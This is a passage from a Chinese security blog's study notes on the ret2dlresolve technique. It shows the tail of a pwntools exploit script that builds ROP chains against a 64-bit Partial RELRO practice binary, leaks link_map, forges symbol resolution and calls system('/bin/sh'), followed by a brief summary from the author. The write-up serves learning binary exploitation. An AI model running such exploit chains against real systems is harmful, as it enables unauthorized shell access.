class="line">rop.raw(csu(<span class="number">0</span>,<span class="number">1</span>,elf.got[<span class="string">&#x27;read&#x27;</span>],<span class="number">0</span>,store_addr,<span class="built_in">len</span>(resolve_data)+<span class="built_in">len</span>(sh)))</span><br><span class="line">rop.raw(show)</span><br><span class="line">rop.raw(<span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">256</span>-<span class="built_in">len</span>(rop.chain())))</span><br><span class="line"><span class="keyword">assert</span>(<span class="built_in">len</span>(rop.chain())&lt;=<span class="number">256</span>)</span><br><span class="line">io.send(rop.chain())</span><br><span class="line"></span><br><span class="line">io.send(resolve_data+sh)</span><br><span class="line"></span><br><span class="line">bin_sh_addr = store_addr + <span class="built_in">len</span>(resolve_data)</span><br><span class="line"></span><br><span class="line"><span class="comment">#泄露link_map addr</span></span><br><span class="line">rop = ROP(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">rop.raw(<span class="string">b&#x27;\x00&#x27;</span>*offset)</span><br><span class="line">rop.raw(csu(<span class="number">0</span>,<span class="number">1</span>,elf.got[<span class="string">&#x27;write&#x27;</span>],<span class="number">1</span>,<span class="number">0x601008</span>,<span class="number">8</span>))</span><br><span class="line">rop.raw(show)</span><br><span class="line">rop.raw(<span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">256</span>-<span class="built_in">len</span>(rop.chain())))</span><br><span class="line">io.send(rop.chain())</span><br><span class="line">link_map_addr = u64(io.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(link_map_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># set l-&gt;l_info[VERSYMIDX(DT_VERSYM)] = NULL</span></span><br><span class="line">rop = ROP(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">rop.raw(<span class="string">b&#x27;\x00&#x27;</span>*offset)</span><br><span class="line">rop.raw(csu(<span class="number">0</span>,<span class="number">1</span>,elf.got[<span class="string">&#x27;read&#x27;</span>],<span class="number">0</span>,link_map_addr+<span class="number">0x1c8</span>,<span class="number">8</span>))</span><br><span class="line">rop.raw(show)</span><br><span class="line">io.sendline(rop.chain())</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">io.send(p64(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">rop = ROP(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">rop.raw(<span class="string">b&#x27;\x00&#x27;</span>*offset)</span><br><span class="line">rop.raw(pop_rdi)</span><br><span class="line">rop.raw(bin_sh_addr)</span><br><span class="line">rop.raw(resolve_call)</span><br><span class="line">io.send(rop.chain())</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>这里又遇到一个问题，在最后一段rop如果是远程环境偏移不变，如果是本地环境偏移就要对应减8，暂时还没有发现原因</p>
<p>小结：</p>
<p>这篇文章断断续续写了快3个星期(最近有点偷懒了)目前的掌握程度还不深要靠实战来加深，加油！</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://mint-sec.github.io">mint</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://mint-sec.github.io/2025/05/20/ret2dlresolve/">http://mint-sec.github.io/2025/05/20/ret2dlresolve/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://mint-sec.github.io" target="_blank">mint1.</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E7%AC%94%E8%AE%B0/">笔记</a><a class="post-meta__tags" href="/tags/%E6%A0%88/">栈</a></div><div class="post_share"><div class="social-share" data-image="/images/Decoration/%E9%9B%85.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2025/05/20/IDA%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/" title="IDA动态调试"><img class="cover" src="/images/Decoration/%E9%9B%85.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">IDA动态调试</div></div></a></div><div class="next-post pull-right"><a href="/2025/05/01/iscc/" title="iscc wp"><img class="cover" src="/images/Decoration/%E9%9B%85.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">iscc wp</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2024/11/30/ret2libc/" title="ret2libc"><img class="cover" src="/images/Decoration/%E9%9B%85.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-11-30</div><div class="title">ret2libc</div></div></a></div><div><a href="/2025/03/20/ret2syscall/" title="ret2syscall"><img class="cover" src="/images/Decoration/%E9%9B%85.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-03-20</div><div class="title">ret2syscall</div></div></a></div><div><a href="/2024/12/10/ret2shellcode/" title="ret2shellcode"><img class="cover" src="/images/Decoration/%E9%9B%85.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-12-10</div><div class="title">ret2shellcode</div></div></a></div><div><a href="/2024/11/09/ret2text/" title="ret2text"><img class="cover" src="/images/Decoration/%E9%9B%85.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-11-09</div><div class="title">ret2text</div></div></a></div><div><a href="/2024/12/09/%E9%9D%99%E6%80%81%E9%93%BE%E6%8E%A5%E4%B9%8Bmprotect/" title="静态链接之mprotect"><img class="cover" src="/images/Decoration/%E9%9B%85.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-12-09</div><div class="title">静态链接之mprotect</div></div></a></div><div><a href="/2025/03/20/GDB%E8%B0%83%E8%AF%95/" title="GDB调试"><img class="cover" src="/images/Decoration/%E9%9B%85.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-03-20</div><div class="title">GDB调试</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/images/1.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">mint</div><div class="author-info__description">pwn小白</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">31</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">5</div></a><a href="/null/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/mint-sec"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">this is my blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ret2dlresolve"><span class="toc-number">1.</span> <span class="toc-text">ret2dlresolve</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8E%9F%E7%90%86%EF%BC%9A"><span class="toc-number">2.</span> <span class="toc-text">原理：</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%B8%E5%85%B3%E7%BB%93%E6%9E%84"><span class="toc-number">2.1.</span> <span class="toc-text">相关结构</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A"><span class="toc-number">2.2.</span> <span class="toc-text">延迟绑定</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#rel-plt-%E6%AE%B5%E7%9A%84%E7%BB%93%E6%9E%84"><span class="toc-number">2.2.1.</span> <span class="toc-text">.rel.plt 段的结构</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%80%9D%E8%B7%AF%EF%BC%9A"><span class="toc-number">3.</span> <span class="toc-text">攻击思路：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90%EF%BC%9A"><span class="toc-number">4.</span> <span class="toc-text">实例分析：</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#32%E4%BD%8D"><span class="toc-number">4.1.</span> <span class="toc-text">32位</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#NO-RELRO%E4%B8%8B%E7%9A%84%E6%83%85%E5%86%B5"><span class="toc-number">4.1.1.</span> <span class="toc-text">NO_RELRO下的情况</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Partial-RELRO%E6%89%8B%E5%B7%A5%E4%BC%AA%E9%80%A0"><span class="toc-number">4.1.2.</span> <span class="toc-text">Partial RELRO手工伪造</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#stage1"><span class="toc-number">4.1.2.1.</span> <span class="toc-text">stage1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#stage2"><span class="toc-number">4.1.2.2.</span> <span class="toc-text">stage2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#stage3"><span class="toc-number">4.1.2.3.</span> <span class="toc-text">stage3</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#stage4"><span class="toc-number">4.1.2.4.</span> <span class="toc-text">stage4</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#stage5"><span class="toc-number">4.1.2.5.</span> <span class="toc-text">stage5</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#stage6"><span class="toc-number">4.1.2.6.</span> <span class="toc-text">stage6</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E5%B7%A5%E5%85%B7%E4%BC%AA%E9%80%A0"><span class="toc-number">4.1.3.</span> <span class="toc-text">基于工具伪造</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Full-RELRO"><span class="toc-number">4.1.4.</span> <span class="toc-text">Full RELRO</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#64%E4%BD%8D"><span class="toc-number">4.2.</span> <span class="toc-text">64位</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#NO-RELRO"><span class="toc-number">4.2.1.</span> <span class="toc-text">NO RELRO</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Partial-RELRO"><span class="toc-number">4.2.2.</span> <span class="toc-text">Partial RELRO</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%8B%E5%B7%A5%E4%BC%AA%E9%80%A0"><span class="toc-number">4.2.2.1.</span> <span class="toc-text">手工伪造</span></a></li></ol></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/06/10/%E5%A0%86/" title="堆"><img src="/images/Decoration/%E9%9B%85.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="堆"/></a><div class="content"><a class="title" href="/2025/06/10/%E5%A0%86/" title="堆">堆</a><time datetime="2025-06-10T01:48:17.000Z" title="发表于 2025-06-10 09:48:17">2025-06-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/06/07/polar2025%E5%A4%8F%E5%AD%A3%E8%B5%9B/" title="polar2025夏季赛复现"><img src="/images/Decoration/%E9%9B%85.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="polar2025夏季赛复现"/></a><div class="content"><a class="title" href="/2025/06/07/polar2025%E5%A4%8F%E5%AD%A3%E8%B5%9B/" title="polar2025夏季赛复现">polar2025夏季赛复现</a><time datetime="2025-06-07T11:09:07.000Z" title="发表于 2025-06-07 19:09:07">2025-06-07</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/06/07/H&amp;NCTFwp/" title="H&amp;NCTFwp"><img src="/images/Decoration/%E9%9B%85.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="H&amp;NCTFwp"/></a><div class="content"><a class="title" href="/2025/06/07/H&amp;NCTFwp/" title="H&amp;NCTFwp">H&amp;NCTFwp</a><time datetime="2025-06-07T03:22:44.000Z" title="发表于 2025-06-07 11:22:44">2025-06-07</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/05/25/LitCTFwp/" title="LitCTF wp（更新中）"><img src="/images/Decoration/%E9%9B%85.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="LitCTF wp（更新中）"/></a><div class="content"><a class="title" href="/2025/05/25/LitCTFwp/" title="LitCTF wp（更新中）">LitCTF wp（更新中）</a><time datetime="2025-05-25T03:03:43.000Z" title="发表于 2025-05-25 11:03:43">2025-05-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/05/20/IDA%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/" title="IDA动态调试"><img src="/images/Decoration/%E9%9B%85.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="IDA动态调试"/></a><div class="content"><a class="title" href="/2025/05/20/IDA%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/" title="IDA动态调试">IDA动态调试</a><time datetime="2025-05-20T06:08:43.000Z" title="发表于 2025-05-20 14:08:43">2025-05-20</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/images/Decoration/%E9%9B%85.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2025 By mint</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script>
  document.addEventListener('DOMContentLoaded', function() {
    // 汉化统计信息
    const replacements = {
      'Article': '文章',
      'Total Count': '总字数',
      'UV': '访客数',
      'PV': '访问量',
      'Last Update': '最后更新',
      'Just now': '刚刚',
      'Archives': '归档',
      'Tags': '标签', 
      'Categories': '分类',
      'Recent Post': '最新文章',
      'Announcement': '公告',
      'Info': '信息',
      'Follow Me': '关注我',
      'January': '一月',
      'February': '二月',
      'March': '三月',
      'April': '四月',
      'May': '五月',
      'June': '六月',
      'July': '七月',
      'August': '八月',
      'September': '九月',
      'October': '十月',
      'November': '十一月',
      'December': '十二月'
    };
    
    
    function replaceText(node) {
      if (node.nodeType === Node.TEXT_NODE) {
        Object.entries(replacements).forEach(([en, zh]) => {
          node.textContent = node.textContent.replace(en, zh);
        });
      } else {
        node.childNodes.forEach(replaceText);
      }
    }

    replaceText(document.body);
  });
</script>
<script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>